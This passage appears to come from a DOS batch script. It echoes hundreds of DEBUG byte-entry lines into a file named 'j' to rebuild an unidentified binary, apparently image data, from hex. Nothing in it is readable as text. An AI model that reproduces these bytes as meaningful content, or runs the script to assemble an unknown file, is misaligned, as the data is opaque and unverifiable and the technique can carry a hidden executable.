echo e 2D70 7A 33 95 86 59 1E EC 21 24 0C E0 D7 59 A6 2B 22>>j
echo e 2D80 10 7A 76 35 96 D6 70 9B 83 8E 0E 78 AD AD 35 44>>j
echo e 2D90 4A D1 E4 9D BE B5 2B 58 DC 9D 5A B9 52 ED 11 AF>>j
echo e 2DA0 49 73 D0 71 FA D7 8D F8 DE DE 38 35 B9 5D 1C 1D>>j
echo e 2DB0 F9 27 1D 8E 4D 7A FE AD F3 5D 29 53 CF 39 FD 6B>>j
echo e 2DC0 C5 BC 5E 1B FB 6E 72 08 38 CF F3 34 D3 69 77 34>>j
echo e 2DD0 A1 26 D3 6C E5 8F 53 52 43 23 26 46 70 0D 46 4E>>j
echo e 2DE0 3A D2 64 E7 D2 B2 6E FA 15 19 F2 CA E5 A9 58 02>>j
echo e 2DF0 01 3C E6 92 3C 33 E3 3D AA B7 2D C9 35 35 B7 FA>>j
echo e 2E00 CC 53 DD 58 D1 54 E6 7A 8F 28 30 D5 22 4B 2A 46>>j
echo e 2E10 A3 18 C5 0A 02 C9 96 FB B5 74 18 99 97 18 C3 55>>j
echo e 2E20 24 96 86 B4 D5 38 C9 F3 3B 16 12 E2 46 70 39 C8>>j
echo e 2E30 15 73 EC AD 72 03 46 B9 38 E4 54 50 AA 79 CA 40>>j
echo e 2E40 E9 5D 1F 87 D3 75 DB 01 8E 9D EB 92 75 39 6A A8>>j
echo e 2E50 AD 8E D8 D6 83 B4 13 BA 38 E9 A1 68 6E 19 5D 0A>>j
echo e 2E60 BF 15 8B 70 C7 CD 62 DE B5 D9 F8 8A 21 1E B3 29>>j
echo e 2E70 38 E8 0F FE 3A 2B 8B 9D B7 4A C7 DE BA F7 93 69>>j
echo e 2E80 9E 66 32 56 76 48 AC EB DF 1D 69 80 66 A7 3C 83>>j
echo e 2E90 50 E7 03 14 EF 73 95 16 6D D3 F7 A9 B4 65 89 E2>>j
echo e 2EA0 BB DF 03 0B 88 F5 E7 79 15 94 6C C7 3F 43 5C 36>>j
echo e 2EB0 9E E1 6F A1 2D D3 35 E8 DE 14 B8 49 F5 59 94 11>>j
echo e 2EC0 C6 7F AD 3B D8 E8 85 9A B3 37 F5 3B 0B 3B FB AF>>j
echo e 2ED0 32 E6 20 C5 7A 66 BC 87 C4 76 AB 06 B9 72 91 AE>>j
echo e 2EE0 13 71 23 F3 35 EC D3 DA 4B 29 62 A3 18 1C 57 92>>j
echo e 2EF0 78 8E 09 23 D5 AE DB 07 86 39 27 EA 69 28 DF 54>>j
echo e 2F00 67 24 9A 39 DE 83 DE A5 89 37 9C 9A 8C 0D C7 AD>>j
echo e 2F10 5A 85 7E 5D 8C 28 93 B2 B9 94 2D 7D 4A CC 84 B1>>j
echo e 2F20 DA 38 14 CC 1A B8 D8 40 57 1D EA 26 C3 60 0A 51>>j
echo e 2F30 95 C6 E1 A5 C8 E2 EA 6A FE 14 C2 A0 75 C5 50 4E>>j
echo e 2F40 01 35 7A 24 66 88 30 AA E6 B7 43 6C 35 DD D1 1F>>j
echo e 2F50 96 77 75 A8 24 03 75 5C 7F 94 66 A8 C9 CB D6 71>>j
echo e 2F60 77 63 AD 68 AB 58 B5 05 CB 2E 10 1E 2B 76 4D BB>>j
echo e 2F70 15 94 F3 81 58 16 F0 16 60 C3 B5 6D 1C 80 99 07>>j
echo e 2F80 91 C5 4C 9A 6E C7 A3 81 9B B7 BE CD 1B 4F 2B C9>>j
echo e 2F90 60 40 DD DE B3 6E 97 FD 21 B0 38 A9 94 94 FB BD>>j
echo e 2FA0 69 92 32 97 C9 23 38 AD 63 0F 66 B9 4D EB 4E 9D>>j
echo e 2FB0 37 6B D8 F5 EB F6 58 15 77 0C BD 60 4C FE 6C 85>>j
echo e 2FC0 C0 C5 6F C1 2A 5E F9 92 30 E8 70 33 55 5B 4B 8D>>j
echo e 2FD0 B2 73 8F 5A 52 AB 15 A1 F3 0E A3 8E 82 A4 C6 F8>>j
echo e 2FE0 A4 20 E1 57 AD 3A EA DA 1B 72 A5 5B B7 22 9F 6F>>j
echo e 2FF0 6A 91 CD 94 E3 3D 6A FB 5B C4 71 E6 E3 6F BD 64>>j
echo e 3000 A4 9E C5 4A AA BA 49 19 B1 DC 05 84 A0 1D 45 55>>j
echo e 3010 55 CC C3 34 3B 01 70 55 3E E6 78 A4 79 3C B6 E6>>j
echo e 3020 AB 68 F9 9A 7B 4B BB 76 35 2C 6D D5 E4 6C D5 2D>>j
echo e 3030 45 76 5E 15 15 25 9D E9 56 24 76 A7 B2 AD CC C5>>j
echo e 3040 DF 93 9C D6 11 BD DF 31 9D 47 19 15 1A D4 16 40>>j
echo e 3050 7A 1E A6 A5 BF B2 8A 08 51 90 E4 9A B7 24 3B 54>>j
echo e 3060 32 8E 31 C5 51 92 4F 38 28 73 F7 49 AD 23 26 4A>>j
echo e 3070 92 B1 A3 A5 B1 8D 40 C6 72 2A B5 DC 2F 2C 93 84>>j
echo e 3080 E3 9C 8F CE AE E9 CE 89 82 71 51 EA 93 88 34 EB>>j
echo e 3090 AB 98 30 58 0F EB 5B 42 6A 37 6D 07 33 5A A3 9A>>j
echo e 30A0 D5 62 92 3B 18 F7 8E 77 63 35 CB 5D 64 DE 0E 7A>>j
echo e 30B0 0A D3 93 58 9A FE DE 25 98 80 43 75 AA 17 30 81>>j
echo e 30C0 7F BF 78 E6 A1 D4 52 77 37 8D 76 E3 A9 59 6E 99>>j
echo e 30D0 4C B1 A8 39 23 15 0B 0C 0C 1C E4 F5 AB F9 88 79>>j
echo e 30E0 D2 8D B9 1C 56 74 D2 31 01 B7 0E B9 C5 4C 9D A4>>j
echo e 30F0 93 14 27 2B 39 74 1A CB B4 F3 43 B1 48 C6 3A D5>>j
echo e 3100 59 66 2C DC 75 A7 96 73 DE A2 AB 96 CB 62 9D 48>>j
echo e 3110 AF 98 AE CC D1 93 E9 55 09 25 C1 15 70 ED 2A 01>>j
echo e 3120 3D 7A D5 29 DF CA 94 ED C1 15 94 5B 7A 18 A6 93>>j
echo e 3130 34 63 70 60 23 1C 91 D6 AB E0 C6 37 0E D5 5A 2B>>j
echo e 3140 B6 07 1E B5 3B CC CC A3 3D E8 E5 6B 71 CA A4 B6>>j
echo e 3150 B9 3C 57 1B 14 B3 72 4D 4E 97 E8 64 19 4A C9 DD>>j
echo e 3160 96 20 9A 76 0B 0E 0F 4A EB 9D 64 E3 CA 95 91 74>>j
echo e 3170 F1 35 21 A7 43 4D 2E F6 CC C7 19 5F 4A AF 7F 74>>j
echo e 3180 92 CE A4 0C 00 2A 04 2E A0 92 7A D4 52 6E 91 B1>>j
echo e 3190 8E 6B 15 15 2D 4D 27 88 6F 44 68 C5 A8 A2 DB 6D>>j
echo e 31A0 C6 0A F4 F7 A4 6B DF 31 83 95 C7 F5 AA 4B 11 08>>j
echo e 31B0 09 19 A4 25 94 E4 0E 2A A2 D4 55 D1 12 9B 7A 33>>j
echo e 31C0 42 5B B3 22 AF CA 30 38 AB 30 DE 42 21 19 5E 73>>j
echo e 31D0 8A C8 8E 5E 08 34 E6 C8 8C 10 71 51 CD 26 CC 5C>>j
echo e 31E0 93 D0 D2 79 62 39 20 01 9A 82 5B F6 0C A8 A3 8E>>j
echo e 31F0 99 AA 3B E4 1F 30 A9 55 4C 8A 09 1C 8A 9F 79 3B>>j
echo e 3200 87 32 4A E8 D0 8F 50 48 B6 92 B9 60 73 9A B1 36>>j
echo e 3210 B2 0F DE 41 92 73 59 0C 87 00 85 3E 95 1B 60 BE>>j
echo e 3220 5E B7 A5 35 1B B9 2D 45 CC D6 B7 2E 1B FF 00 31>>j
echo e 3230 C3 15 E9 56 E0 D4 B6 5B 04 0B CD 62 90 14 63 3C>>j
echo e 3240 50 B2 10 00 07 81 43 9A 93 D4 DA 15 E5 D4 F4 18>>j
echo e 3250 6C DF 50 BB 8A 31 C2 B8 02 A2 D4 3C 2A A2 66 0E>>j
echo e 3260 CC 15 3A E0 75 AC 6B 0F 10 DC C3 77 1B 2B 80 06>>j
echo e 3270 30 30 2B B2 D2 75 4F ED 41 70 25 71 BB 6E 00 E2>>j
echo e 3280 AB 96 D2 21 55 93 BB 3C E7 50 D3 45 A4 9F 26 E2>>j
echo e 3290 87 A1 22 AB DB DD B2 5C C7 D7 E5 23 35 EA BF D8>>j
echo e 32A0 96 97 76 43 2C AC 72 73 ED 5C CD F7 86 2D 91 66>>j
echo e 32B0 95 07 2B D3 9A 52 6A E0 EA 24 AF DC CC 8B 58 25>>j
echo e 32C0 A5 D8 39 AE A7 40 F1 53 D9 69 85 0C 40 82 7B FA>>j
echo e 32D0 D7 01 73 0B D9 BE 54 10 1B 35 1A 6A 32 C6 15 54>>j
echo e 32E0 F0 B9 A9 51 D6 E4 28 46 FC C7 AE 37 88 A5 32 47>>j
echo e 32F0 27 91 B5 4A 86 23 DF BD 5C D1 BC 47 34 D3 C8 5D>>j
echo e 3300 33 96 38 FA 76 AF 2A FF 00 84 8A E9 E3 54 2C 36>>j
echo e 3310 ED 02 AE D9 6A B7 A3 2F 1C 9C 0F 61 59 D9 A7 7B>>j
echo e 3320 E8 4C B9 9B D1 9E BC DF E9 B2 B4 B8 C6 D0 6B C8>>j
echo e 3330 BC 47 65 F6 8F 11 5D 00 DF 2F 3F 9E 4D 6A 2F 8A>>j
echo e 3340 2F E3 81 63 DF 90 C7 24 8A CD 92 61 71 75 3C E5>>j
echo e 3350 F2 F2 64 93 EF 5D 52 AC AD 65 B1 B4 6A CE 3B 1C>>j
echo e 3360 BD D5 82 C3 6B E6 77 27 15 9C E0 05 18 AD CD 50>>j
echo e 3370 7F A0 A6 0F 7A CB B8 50 60 88 FE 75 CF 07 CD A9>>j
echo e 3380 A5 5A C9 DA C8 AF 19 E9 53 6D 30 B6 FF 00 51 50>>j
echo e 3390 64 2B 71 56 19 BC C4 5C 9E 3A 55 ED A8 46 69 68>>j
echo e 33A0 C7 28 F3 10 B6 79 AD 5B 58 57 EC AA 4D 64 17 D8>>j
echo e 33B0 98 4E 6A 64 BC 75 84 26 6B 9E 6A 52 5A 13 29 C6>>j
echo e 33C0 5B EE 6B 5A 48 24 BB 11 93 80 6B 77 4E BB 36 33>>j
echo e 33D0 EE EB DA B9 CD 3A 27 17 88 40 EB 5A 73 B3 A4 8A>>j
echo e 33E0 B8 AE 3A 97 E7 49 04 6A A8 C7 47 66 69 6A 62 3B>>j
echo e 33F0 F9 DA 53 F7 98 7F 4A F3 FB C8 84 37 12 2E 7B D7>>j
echo e 3400 6D 04 C0 46 43 60 1C 57 1F A8 C6 3E D1 2B 0E 79>>j
echo e 3410 AE BC 24 DA 6D 4B 73 25 26 F5 6E E5 02 45 40 DF>>j
echo e 3420 7A A5 ED 4C 71 DE BB AF A9 4A 57 24 B7 CB 4E 83>>j
echo e 3430 DE BB BF 05 37 97 AC C8 33 D8 FF 00 23 5C 7C 76>>j
echo e 3440 E1 96 13 1F 2E 7B 0A E8 3C 30 B7 36 BA 93 CA E8>>j
echo e 3450 CB C7 7F C6 A2 76 1C 6B 38 DE 5D 11 EA 62 FB 0B>>j
echo e 3460 8C 63 15 E4 FE 2B 9D 9F 53 BB 18 C8 63 F9 72 6B>>j
echo e 3470 AE 7D 42 70 ED 83 9E 2B 8B D4 A1 9E EA 6B 89 19>>j
echo e 3480 4F 2C 79 A9 75 12 97 2A 62 75 62 D2 96 D7 39 94>>j
echo e 3490 EB D7 A5 4C 93 1D DC F7 A8 18 15 62 29 33 5A B5>>j
echo e 34A0 70 F3 2E 38 2F 19 23 9E 39 A8 8C 7B 63 59 01 EF>>j
echo e 34B0 4A B2 15 8F 00 F5 14 E8 CE 60 39 F5 A9 5A 0D BB>>j
echo e 34C0 90 2F 70 6B 4A D8 FE E3 19 AC D7 27 35 76 DC 93>>j
echo e 34D0 00 C5 54 A4 94 4D 29 D5 95 37 74 24 ED C7 15 48>>j
echo e 34E0 F2 6A E3 83 9E 45 46 62 1B 77 54 43 44 15 6A F3>>j
echo e 34F0 BB 92 D9 DC F9 4A 38 CF 35 B0 64 69 59 0F 6E D5>>j
echo e 3500 CF A2 12 C3 1E B5 B5 11 60 E8 33 D0 54 4D 28 FB>>j
echo e 3510 CB 73 7A 35 AD EE 32 59 98 C6 49 A2 38 4C C9 BF>>j
echo e 3520 38 A7 B2 86 DC 1B 91 DA A3 59 3C B5 DA 3A 0A E6>>j
echo e 3530 52 6F 73 39 D7 8C DE A7 AB 69 72 84 89 E3 3F 7B>>j
echo e 3540 39 AB CD 22 AA E4 9C 67 A5 67 DC 0F 2F 5A 3B 78>>j
echo e 3550 04 74 A3 50 66 17 10 00 78 26 BD 2A 98 65 25 68>>j
echo e 3560 EE 63 52 2A D7 66 94 18 50 64 6E 00 AA D7 66 5B>>j
echo e 3570 E6 DB 6E DC 01 CD 2D D1 2B A7 64 7A D3 74 52 5B>>j
echo e 3580 7E 4F 7A F3 39 5C 26 D1 9D EC B5 1B 25 93 EC 8C>>j
echo e 3590 28 00 AF 5A CF B9 53 9F A5 75 6C 83 C8 63 8E 6B>>j
echo e 35A0 8E B9 90 89 DC 13 DC D7 72 A9 CC 92 68 98 B7 CC>>j
echo e 35B0 D9 6F 4F 89 E5 66 DB CE 05 5A CB 40 E7 22 97 C3>>j
echo e 35C0 D8 F3 24 AB 37 51 89 E6 7C 1C 60 E2 A2 70 BE A8>>j
echo e 35D0 96 D2 90 AF 2F 99 6A 84 1C 62 A9 43 12 09 4E 79>>j
echo e 35E0 C9 A7 92 52 D5 90 75 DD B6 82 C6 D4 46 EC B9 DD>>j
echo e 35F0 81 44 2E D8 5A EC 3C C6 49 88 C6 00 CE 2B 27 50>>j
echo e 3600 BD 47 D3 EE D1 64 E4 9E 46 7D EA 2D 57 C4 5F 67>>j
echo e 3610 D4 7C 95 80 9D C0 FC C7 8F E9 5C 96 A1 AA 34 66>>j
echo e 3620 E4 EC C7 98 C7 03 F1 AE E5 41 5B 9A 47 55 38 A7>>j
echo e 3630 12 2B A4 71 6E 9B 09 1F 36 73 DA A0 13 32 49 FB>>j
echo e 3640 C2 73 8E A6 A7 17 EC 34 DB 64 64 DC 77 60 9F 4E>>j
echo e 3650 07 B5 50 D5 65 67 95 59 7A 62 B8 AA 50 6B DE 8E>>j
echo e 3660 C4 D9 5E C8 12 5C 4A EA 1F 82 73 D6 95 9D B1 CF>>j
echo e 3670 D0 56 6A B1 20 B6 4F 14 F4 B9 60 30 4F 7E F5 0B>>j
echo e 3680 47 71 39 69 62 F2 46 0B 6E 22 83 2A FC E8 3F 3A>>j
echo e 3690 64 77 7B 94 0F CE A1 32 0D E7 6F 02 88 BE 77 EF>>j
echo e 36A0 19 CD A7 1B 75 26 CE 07 3C D5 49 94 93 9A 95 65>>j
echo e 36B0 2C D9 23 A5 23 3E F1 8C 54 B8 F2 BD 0C E3 76 88>>j
echo e 36C0 55 48 15 61 4B 32 00 47 4A 48 E1 2E 78 AB 11 C2>>j
echo e 36D0 30 79 AE 8A 69 4E 36 63 A7 67 2D 48 3C 92 CD C1>>j
echo e 36E0 A9 63 89 90 9D DD 07 6A B2 91 01 8C 77 A6 C8 50>>j
echo e 36F0 02 09 E6 9D 4A 31 71 B4 77 3A DC 63 61 FE 4A BC>>j
echo e 3700 39 43 CF A5 54 09 B1 88 3D 69 E2 6D AB 85 6A 78>>j
echo e 3710 1B CE 48 E6 B9 14 5C 5F 2B 30 E6 B6 A2 C4 C0 21>>j
echo e 3720 04 73 50 48 AE CF 81 53 32 15 E8 29 47 CA 01 35>>j
echo e 3730 A7 3C 76 05 3B BB 91 DB D9 4D 32 B1 51 9C 53 27>>j
echo e 3740 8A 58 E4 08 F9 06 B6 74 DB A1 6E 8E 0A E4 9E 6B>>j
echo e 3750 4D 74 31 AB 43 F6 90 FB 49 3D 2A F9 22 D5 E3 B9>>j
echo e 3760 CE E7 69 1C 98 60 A3 D6 A6 B5 DC E4 F1 C5 68 6A>>j
echo e 3770 1A 2F D8 53 3B F7 01 ED D6 A9 C3 37 93 19 00 75>>j
echo e 3780 EF 59 53 76 9E A4 CD 69 63 51 14 1B 54 50 80 B1>>j
echo e 3790 E6 B2 AE 2D 9D A6 23 18 22 B4 E0 B8 56 58 94 9E>>j
echo e 37A0 49 ED 5D 8D AF 83 22 9E F9 04 93 12 84 65 86 31>>j
echo e 37B0 9F D6 BD 4F 61 4A D7 67 7D 28 43 91 77 3C C2 58>>j
echo e 37C0 9C 75 A4 00 04 F7 AF 47 D6 7C 1F A7 5A C9 18 8D>>j
echo e 37D0 CE 3B 82 4F 3F AD 71 9A 86 9B 1D BD EC 89 17 CA>>j
echo e 37E0 A0 67 1D 7B 57 15 5A 0D 2E 68 EC 43 B5 EC 8C 8D>>j
echo e 37F0 C7 39 C9 AD 1D 3A F9 ED D9 B1 21 04 8F 5A CF 61>>j
echo e 3800 86 20 9A 61 CE EF 96 A2 12 71 77 64 BD AC 77 BA>>j
echo e 3810 5E AA A9 64 49 9F 1B 4E 4E 4F 5E 4D 6E 9D 42 CA>>j
echo e 3820 7C 2C 6E 0E F4 19 07 D7 15 E5 6A EF B7 6E E3 57>>j
echo e 3830 ED F5 23 6D 32 38 EA B8 A7 78 CD EA 12 B3 8D 8E>>j
echo e 3840 AB 53 D2 45 EC 31 24 40 07 2F 8E 7B 0C D7 2D AA>>j
echo e 3850 68 57 D6 37 9E 53 C7 C1 E4 30 E9 8A E9 AC B5 D6>>j
echo e 3860 BC 90 28 5E 9F 35 6A DC A8 D5 61 F3 89 23 60 C7>>j
echo e 3870 4A 53 BC 5E 84 5E CA C8 F2 FC 3A 48 50 9F BA 71>>j
echo e 3880 5A 36 93 04 C6 5F 03 3E B4 CB EB 7D 97 73 E7 B3>>j
echo e 3890 1F E7 54 C1 C0 CD 6B 4D 29 68 C2 9A 52 96 A7 51>>j
echo e 38A0 69 71 69 B1 84 87 18 24 75 AA 64 1D EE E9 9D 84>>j
echo e 38B0 E4 7D 2B 19 73 C1 C9 EB CD 69 1D 49 04 22 20 BD>>j
echo e 38C0 14 0A 27 41 35 64 75 4A DD 48 B5 37 57 B5 5D A7>>j
echo e 38D0 A1 AC A9 89 30 A0 AD 1B C5 06 D0 10 79 AA 32 29>>j
echo e 38E0 78 D3 03 18 AE 65 07 4D F2 B3 36 FA 95 88 C0 C9>>j
echo e 38F0 A1 9B 00 60 F1 4E 6C 6F C3 53 9E 15 C6 01 AD 39>>j
echo e 3900 96 CD 13 77 7B 89 13 65 5A A3 6C F0 73 C5 4B 1A>>j
echo e 3910 85 46 A8 9C 82 B8 AA 51 8B D8 CD BF 78 E9 74 BB>>j
echo e 3920 98 84 F1 E4 F6 AB F7 0E 26 6D D1 81 F2 D7 33 A7>>j
echo e 3930 CA 4C AA BE 95 B7 6A 4E 5B F5 AE 2E 45 0A BC CC>>j
echo e 3940 C2 B4 74 B9 21 52 49 6A C3 B9 C3 F9 C7 1C 57 48>>j
echo e 3950 D8 11 9E 3B 57 37 75 90 24 60 7D B1 5E ED 4C 25>>j
echo e 3960 38 C1 54 5D 51 DF 42 95 35 45 4A 3B BD CC 73 49>>j
echo e 3970 26 36 52 9E 69 AF F7 6B 8B 94 87 B9 7F 42 0F 26>>j
echo e 3980 B1 6C 8B C9 2C 06 2B D5 5B 46 9B CC 7C 20 C8 EA>>j
echo e 3990 05 79 8F 86 41 4D 76 D9 C8 FB AD 9A F6 9D 37 50>>j
echo e 39A0 FB 55 EB A9 FB C3 39 E2 B1 95 45 0A 8A 46 35 2A>>j
echo e 39B0 59 72 2D D9 CB DC DB 3D B4 FE 5B E0 1D B5 CD DF>>j
echo e 39C0 DE C1 10 B8 4C FC E0 72 2B D3 6F 74 18 AF A6 69>>j
echo e 39D0 DD CA BF 41 8F FF 00 5D 79 17 88 F4 E6 B7 D5 AF>>j
echo e 39E0 23 42 4E D2 73 EF C9 A8 87 2D 49 B9 49 58 A8 49>>j
echo e 39F0 3A 4A 9B 5A AE A7 35 21 DC 4B 7B D3 28 39 1C 51>>j
echo e 3A00 5D 46 88 9E 12 80 1D D4 84 91 D3 EE 93 50 F7 A9>>j
echo e 3A10 11 8B 0D A4 D3 8A 4D D9 82 5A 92 70 56 AC DA B8>>j
echo e 3A20 48 B0 47 5A 85 57 E5 34 E4 94 2E D0 47 20 D3 9D>>j
echo e 3A30 24 D7 2A DC DE C9 2D 49 DF 1D 4D 55 90 FA 1A BC>>j
echo e 3A40 E8 1B AF 71 54 E7 8D 7F 84 D6 3C 8E 12 E5 66 57>>j
echo e 3A50 D2 E8 8E 39 4A 32 E7 A6 6B 61 6E 62 67 1C 8A C3>>j
echo e 3A60 2B C7 D2 9F 6C 77 4E 05 54 AC E1 6B 15 09 F2 C9>>j
echo e 3A70 33 A2 47 46 56 39 E9 55 59 BE 63 4F B6 8F 28 E2>>j
echo e 3A80 9A 57 9A C6 14 A9 B5 BE A7 3D 69 DE A3 6B 43 D7>>j
echo e 3A90 6E A1 7F ED 82 E7 A0 A2 E6 03 70 F1 CA A7 01 4F>>j
echo e 3AA0 4A B3 2C 82 6B CD CB C8 23 8A 51 80 AC A4 60 8A>>j
echo e 3AB0 E9 A9 5E 51 38 EA 4E 6E 56 B9 15 DE 3F B3 B0 4E>>j
echo e 3AC0 29 BA 11 C8 93 EB 50 DF 87 F2 41 FE 0A 9B 43 E8>>j
echo e 3AD0 FF 00 5A E6 9B 8C 9A 66 BE D6 4E 2A 2C DB 91 8A>>j
echo e 3AE0 C2 7D 0D 72 13 DB 09 2E 1C EF 18 24 D7 5B 29 1E>>j
echo e 3AF0 49 CD 71 57 2E 7E D4 E1 09 C6 4D 11 2E 9B 7B 9B>>j
echo e 3B00 DE 1F 84 24 92 7C D9 AB 33 C6 D6 92 C8 EE 09 0C>>j
echo e 3B10 7A D5 4F 0D E7 74 85 BB 56 B5 C3 8B 92 63 3D 01>>j
echo e 3B20 AB D1 6A 53 B3 33 6D E1 12 B1 63 9D 85 B7 0A B7>>j
echo e 3B30 7D 6B BE 18 88 EC 6A 68 A1 01 76 E3 81 D2 AE 4E>>j
echo e 3B40 89 F6 78 41 EE 6B 58 C2 C8 A6 D3 7A 1E 47 E2 57>>j
echo e 3B50 9C 78 80 C6 57 1B 17 8F D6 B9 3B D9 DE 57 94 31>>j
echo e 3B60 E8 C7 15 E8 FE 26 48 97 C4 5E 64 B8 0B 8D BE BC>>j
echo e 3B70 64 F3 5E 75 AA 2C 27 51 B8 4B 73 94 0E 70 7F 1A>>j
echo e 3B80 E9 9B 94 60 93 66 51 72 4D A2 28 67 91 C2 44 4E>>j
echo e 3B90 14 1C D1 77 31 69 30 0F 41 8A AF B5 D0 06 23 8A>>j
echo e 3BA0 8C B1 2C 49 EA 6B 99 4F 75 D0 D1 37 7B A2 78 C9>>j
echo e 3BB0 D8 DD 2A 32 41 34 F5 60 22 23 B9 A8 95 48 E4 D6>>j
echo e 3BC0 5A 05 EE C9 55 F6 B6 05 38 B6 72 3B 7A D4 6A 0B>>j
echo e 3BD0 70 07 34 F6 FB BB 31 C8 EB 52 32 54 18 18 06 91>>j
echo e 3BE0 46 3A 9A 48 90 91 D7 B5 39 A1 62 37 0A D2 36 9E>>j
echo e 3BF0 9D 82 32 49 32 F4 24 04 1B 47 6A 8F 78 0F 8C F5>>j
echo e 3C00 A9 2C 80 16 EC 4F 24 F1 52 7D 94 B8 0E 57 BD 6B>>j
echo e 3C10 1A 6F A1 CE 93 4E E3 41 2C 30 A7 9A 8D 94 86 C1>>j
echo e 3C20 15 71 2D F3 22 85 18 6A 6C 91 3A 5C 32 B7 7F 5A>>j
echo e 3C30 99 C9 C4 BE 6B AD CA 61 55 5B 3E 95 3C 72 04 19>>j
echo e 3C40 3C 93 DA 87 B6 60 37 05 24 7A 8A 7C 71 7C DD 3A>>j
echo e 3C50 FA F6 AE 7A 92 4F 51 54 A8 D4 6C 3D 53 CC 39 3D>>j
echo e 3C60 FD 2A 47 B3 60 9D 2A C5 A4 1B 0E 49 AD 35 8C 4C>>j
echo e 3C70 A6 B8 6A D4 B3 D0 E4 55 E4 8C 88 E3 28 8B 91 5D>>j
echo e 3C80 46 8B 74 91 A2 44 48 01 88 1F CA B0 EE 22 0A C4>>j
echo e 3C90 67 81 4E B2 52 B3 C6 F9 FB AC 2B 6C 3D 54 9E A6>>j
echo e 3CA0 91 97 33 4D 9D DE B9 A3 5B 4B A6 3E 53 32 63 E5>>j
echo e 3CB0 C5 79 BD CE 9E 6D D4 86 8C 82 4F 15 E9 8B A9 23>>j
echo e 3CC0 BA 21 20 96 5C 80 6B 95 D6 A0 96 57 2E 98 DA 0D>>j
echo e 3CD0 7A 94 A8 73 A2 F1 35 3D E5 63 9D B6 B2 95 AE 20>>j
echo e 3CE0 64 8D CA 82 39 03 8A F6 CB 7B 40 1E 39 73 D0 0E>>j
echo e 3CF0 2B 84 D1 26 44 B3 B7 46 50 0E FE 7D F8 AF 42 82>>j
echo e 3D00 55 18 24 12 0F 15 A5 4A 72 A6 B5 65 42 A3 B5 91>>j
echo e 3D10 0B E9 F6 77 93 07 96 3C ED AE 5B 5B D2 6D 1A EE>>j
echo e 3D20 56 8E DC 15 0B 9C 8F 5C 0A EE 1F CB 55 E0 6D 07>>j
echo e 3D30 BD 50 B8 8C 6D 74 45 1F 37 53 8E B5 CC AA DF 46>>j
echo e 3D40 69 16 D3 B9 E1 57 5A 7C AC D2 C8 20 65 50 71 D2>>j
echo e 3D50 A9 2C 07 A6 D3 CD 7B 3E A3 A5 29 D2 64 CA A2 67>>j
echo e 3D60 93 C5 79 5C F1 4B 68 E8 AC 01 52 4F 3F 8D 45 D5>>j
echo e 3D70 85 CF 29 33 1E 44 2A F8 3C 53 4A 67 9C D5 DB 8B>>j
echo e 3D80 79 6E 2E 1C A8 E8 01 FD 2A 8E 0A B3 03 DA B1 92>>j
echo e 3D90 B3 D0 D2 EC B9 6B 71 2D B6 59 0E 09 18 AD ED 2F>>j
echo e 3DA0 5A 96 3B 49 14 B6 46 7A 1A E6 D5 BE 51 40 94 A0>>j
echo e 3DB0 C0 35 B4 5F 3B B7 60 83 B2 77 34 AF C2 B9 79 01>>j
echo e 3DC0 CE EC 9A CC 8D 57 CA C9 EB 9A 59 26 DD 1E 03 53>>j
echo e 3DD0 14 80 79 AD E3 0E C6 71 4D 03 65 7A 1A 5B 64 32>>j
echo e 3DE0 5C 0C F4 A6 B0 DD 82 0F 1D 29 62 67 8A 50 47 4A>>j
echo e 3DF0 CE A4 9A D0 6D C9 AD CB 97 8B FB AD A0 F4 AA 12>>j
echo e 3E00 3F EE D5 71 C8 AD 0B 93 BA 35 23 EF 67 A5 67 4C>>j
echo e 3E10 0F 5C 73 9A CA 55 23 31 46 6D 2E 56 55 7C 97 CD>>j
echo e 3E20 48 4B 12 08 A6 48 49 6F 7A 9E DB DC F6 A5 2B 24>>j
echo e 3E30 5A 6C 56 8F 6C 64 93 D6 AB 32 91 D2 AD 3E 5B 23>>j
echo e 3E40 D2 A2 60 4A F1 4A 12 B3 19 3D 80 2B 78 A0 F4 35>>j
echo e 3E50 D0 D9 08 D9 9C 13 D2 B9 C8 18 2B AE 0F CC 39 AD>>j
echo e 3E60 0B 47 6D ED C9 AE 98 50 53 D5 A3 2C 53 E6 D2 27>>j
echo e 3E70 A1 59 69 D6 B2 D8 42 EC 37 10 08 FD 6B CF 75 BB>>j
echo e 3E80 64 B7 69 B6 1E 37 F1 F9 D7 79 A2 DE 45 1E 94 88>>j
echo e 3E90 ED F3 8C E7 3F 53 5C 7E BD 18 93 CE 61 FD EC D7>>j
echo e 3EA0 55 48 4E 31 B3 7A 19 D2 A8 E9 A5 1B EE 72 74 D7>>j
echo e 3EB0 1F 2D 3C F0 71 4C 73 C5 71 F3 6A 75 2B BD 4D 3F>>j
echo e 3EC0 0F 13 FD AD 0F 35 E9 DE 1F 9D 97 58 97 71 C2 9C>>j
echo e 3ED0 FF 00 5A F2 ED 00 81 AB 41 9E 9B 85 77 7A AB 3D>>j
echo e 3EE0 B3 B3 C6 E5 06 72 31 DE B9 EB 28 9E 6E 37 99 55>>j
echo e 3EF0 56 3D 03 ED 05 81 C3 0C 0C D7 0D AC E9 D1 CA D7>>j
echo e 3F00 D7 1B 7E 76 07 9A BF A2 EA 00 D9 6E 95 8B 12 4F>>j
echo e 3F10 35 0E A7 74 A7 4A BA 65 E5 8E 78 AC E9 A6 96 87>>j
echo e 3F20 55 09 36 B5 3C 8A 54 DB F5 CD 47 8C D4 F7 23 E6>>j
echo e 3F30 CE 3B D4 00 7A 57 62 7A 1D 6B 60 A0 1C 51 47 7A>>j
echo e 3F40 63 2D 46 49 8F 38 CD 41 92 64 CF BD 4F 6E 47 92>>j
echo e 3F50 C0 9E F5 13 21 0D 9A 6E 6C 57 6F 72 E3 39 6E 33>>j
echo e 3F60 4C 44 CF 5A 82 46 DA 72 0D 4B 6F 2A E1 95 CF 6E>>j
echo e 3F70 2A 66 F9 90 B9 9A 40 C8 A5 09 1D 45 41 13 6C 90>>j
echo e 3F80 30 ED 56 11 72 5F 9E 31 50 2A E1 F0 6A 17 60 8B>>j
echo e 3F90 35 2C AF 09 57 C8 FF 00 3C D6 84 0A 1E 2D C4 67>>j
echo e 3FA0 24 F6 AC 5B 34 27 7E 3D BF AD 74 B6 11 FF 00 A2>>j
echo e 3FB0 2E 41 EF 58 4E D1 91 9D 4B 9E 8F A5 30 BA 90 63>>j
echo e 3FC0 85 06 AD B3 6E 9A 43 8E F5 47 48 89 A1 33 05 3C>>j
echo e 3FD0 03 91 56 E1 57 66 93 2A 79 AE 8A F1 B3 5D 81 E1>>j
echo e 3FE0 DC A3 A9 1E B0 E2 2B 15 00 75 35 1F 87 1F 7C 2E>>j
